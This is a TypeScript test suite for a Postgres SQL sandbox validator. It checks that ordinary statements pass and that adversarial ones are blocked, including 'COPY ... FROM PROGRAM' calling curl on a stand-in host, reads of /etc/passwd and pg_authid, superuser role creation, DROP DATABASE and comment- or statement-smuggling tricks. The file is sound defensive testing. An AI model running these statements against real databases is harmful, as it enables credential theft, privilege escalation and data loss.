/**
 * Sandbox tests. Run with:  npm run test:sandbox
 *
 * These are deliberately adversarial: the interesting cases are the ones that
 * try to smuggle a banned statement past the filter using Postgres lexical
 * quirks (strings, dollar quotes, comments, quoted identifiers).
 */
import { validateSql, tokenizeSql, SqlValidationError } from "./sql-sandbox";

const SCHEMA = "playground_abc123";

let passed = 0;
let failed = 0;

function expectAllowed(label: string, sql: string) {
  try {
    validateSql(sql, SCHEMA);
    passed += 1;
    console.log(`  ok    allow  ${label}`);
  } catch (error) {
    failed += 1;
    const message = error instanceof Error ? error.message : String(error);
    console.log(`  FAIL  allow  ${label}\n          expected to pass, got: ${message}`);
  }
}

function expectBlocked(label: string, sql: string) {
  try {
    validateSql(sql, SCHEMA);
    failed += 1;
    console.log(`  FAIL  block  ${label}\n          expected to be blocked, but it passed`);
  } catch (error) {
    if (error instanceof SqlValidationError) {
      passed += 1;
      console.log(`  ok    block  ${label}`);
    } else {
      failed += 1;
      console.log(`  FAIL  block  ${label} — wrong error type`);
    }
  }
}

function expectStatementCount(label: string, sql: string, count: number) {
  const actual = tokenizeSql(sql).length;
  if (actual === count) {
    passed += 1;
    console.log(`  ok    split  ${label} (${actual})`);
  } else {
    failed += 1;
    console.log(`  FAIL  split  ${label} — expected ${count} statements, got ${actual}`);
  }
}

console.log("\nAllowed statements");
expectAllowed("create table", "CREATE TABLE students (id SERIAL PRIMARY KEY, name TEXT NOT NULL);");
expectAllowed("select", "SELECT * FROM students WHERE id = 1;");
expectAllowed("insert returning", "INSERT INTO students (name) VALUES ('Ada') RETURNING id;");
expectAllowed("update", "UPDATE students SET name = 'Ada L' WHERE id = 1;");
expectAllowed("delete", "DELETE FROM students WHERE id = 1;");
expectAllowed("truncate", "TRUNCATE TABLE students RESTART IDENTITY;");
expectAllowed("alter table add constraint", "ALTER TABLE students ADD CONSTRAINT chk CHECK (length(name) > 1);");
expectAllowed("create index", "CREATE UNIQUE INDEX idx_students_name ON students (name);");
expectAllowed("drop table", "DROP TABLE IF EXISTS students CASCADE;");
expectAllowed("explain", "EXPLAIN ANALYZE SELECT * FROM students;");
expectAllowed("cte", "WITH recent AS (SELECT * FROM students LIMIT 5) SELECT * FROM recent;");
expectAllowed("system catalog read", "SELECT table_name FROM information_schema.tables;");
expectAllowed("comment on", "COMMENT ON TABLE students IS 'people';");
expectAllowed("multi statement", "CREATE TABLE a (id INT); INSERT INTO a VALUES (1); SELECT * FROM a;");
expectAllowed("own schema reference", `SELECT * FROM ${SCHEMA}.students;`);

console.log("\nBanned statements");
expectBlocked("drop database", "DROP DATABASE neondb;");
expectBlocked("create role", "CREATE ROLE hacker SUPERUSER;");
expectBlocked("alter role", "ALTER ROLE postgres WITH PASSWORD 'x';");
expectBlocked("grant", "GRANT ALL ON ALL TABLES IN SCHEMA public TO PUBLIC;");
expectBlocked("copy from program", "COPY students FROM PROGRAM 'curl evil.example';");
expectBlocked("pg_read_file", "SELECT pg_read_file('/etc/passwd');");
expectBlocked("large object export", "SELECT lo_export(1, '/tmp/x');");
expectBlocked("dblink", "SELECT * FROM dblink('host=other', 'SELECT 1') AS t(x INT);");
expectBlocked("do block", "DO $$ BEGIN PERFORM 1; END $$;");
expectBlocked("create function", "CREATE FUNCTION f() RETURNS INT AS 'SELECT 1' LANGUAGE sql;");
expectBlocked("create extension", "CREATE EXTENSION dblink;");
expectBlocked("alter system", "ALTER SYSTEM SET log_statement = 'none';");
expectBlocked("drop schema", "DROP SCHEMA public CASCADE;");
expectBlocked("create schema", "CREATE SCHEMA sneaky;");
expectBlocked("read credentials", "SELECT * FROM pg_authid;");
expectBlocked("app tables via public", "SELECT * FROM public.users;");
expectBlocked("other session schema", "SELECT * FROM playground_someoneelse.secrets;");
expectBlocked("set role", "SET ROLE postgres;");
expectBlocked("transaction control", "BEGIN;");
expectBlocked("pg_sleep", "SELECT pg_sleep(60);");
expectBlocked("terminate backend", "SELECT pg_terminate_backend(1);");
expectBlocked("vacuum", "VACUUM FULL;");
expectBlocked("lock", "LOCK TABLE students IN ACCESS EXCLUSIVE MODE;");
expectBlocked("prepare", "PREPARE evil AS SELECT 1;");
expectBlocked("empty input", "   ");
expectBlocked("only comments", "-- just a note\n/* and another */");

console.log("\nLexical smuggling attempts");
// A banned word inside a string literal is data, not a command: must be allowed.
expectAllowed("banned word as data", "INSERT INTO notes (body) VALUES ('please GRANT me access');");
expectAllowed("semicolon inside string", "INSERT INTO notes (body) VALUES ('a;b');");
expectAllowed("dollar quoted data", "INSERT INTO notes (body) VALUES ($tag$ DROP DATABASE x; $tag$);");
expectAllowed("comment containing drop", "SELECT 1; -- DROP DATABASE neondb");
// ...but hiding a real command must not work.
expectBlocked("quoted identifier catalog", 'SELECT * FROM "pg_authid";');
expectBlocked("block comment before command", "/* harmless */ DROP DATABASE neondb;");
expectBlocked("second statement banned", "SELECT 1; DROP DATABASE neondb;");
expectBlocked("statement after string", "INSERT INTO notes (body) VALUES ('a;b'); DROP DATABASE x;");
expectBlocked("nested block comment", "/* outer /* inner */ still comment */ GRANT ALL ON x TO y;");
expectBlocked("case and whitespace", "  dRoP    dAtAbAsE   neondb  ;");
expectBlocked("newline separated", "SELECT 1\n;\nCREATE ROLE r;");

console.log("\nStatement splitting");
expectStatementCount("semicolon in string does not split", "SELECT 'a;b;c';", 1);
expectStatementCount("dollar quote does not split", "SELECT $$ a; b; c $$;", 1);
expectStatementCount("line comment does not split", "SELECT 1; -- a; b\nSELECT 2;", 2);
expectStatementCount("trailing semicolon ignored", "SELECT 1;;;", 1);
expectStatementCount("escaped quote", "SELECT 'it''s fine';", 1);
expectStatementCount("E-string backslash quote", "SELECT E'a\\'; b';", 1);

console.log(`\n${passed} passed, ${failed} failed\n`);
if (failed > 0) process.exit(1);
